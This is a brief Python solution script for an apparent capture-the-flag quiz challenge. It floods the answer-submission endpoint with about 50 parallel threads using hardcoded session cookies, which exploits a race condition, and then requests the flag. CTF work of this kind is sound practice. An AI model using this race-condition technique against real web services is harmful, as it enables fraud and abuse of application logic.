#!python3
import requests
import threading
from multiprocessing.dummy import Pool as ThreadPool
cookies={
    'INGRESSCOOKIE':'1647154420.414.13402.417373|df18c7a37b01201195c3bf2ff6aa23c8',
    'connect.sid':"s%3AI0J6D-OLWqntaWNpYGx_lQsEcNBtDW1m.WiioLQU6iuskoVWIDBjbDHaXIyuDLpIg%2FpakO5eIWYM"
}
json_data = {"questionNumber":2,"answer":"10"}

def runner(d):
	r1 = requests.post('https://quiz.ctf.intigriti.io/submitAnswer', cookies=cookies,json=json_data)
	r2 = requests.get('https://quiz.ctf.intigriti.io/user', cookies=cookies)


## Solution 1: Use multiprocessing.dummy

# pool = ThreadPool(40)
# result = pool.map_async(runner,range(40))
# r2 = requests.get('https://quiz.ctf.intigriti.io/buyFlag', cookies=cookies)
# print(r2.text)

## Solution 2: Use threading
threads=[]
for i in range(50):
    t=threading.Thread(target=runner,args=[i])
    t.start()
    threads.append(t)
for thread in threads:
    thread.join()
print(threads)
r2 = requests.get('https://quiz.ctf.intigriti.io/buyFlag', cookies=cookies)
print(r2.text)
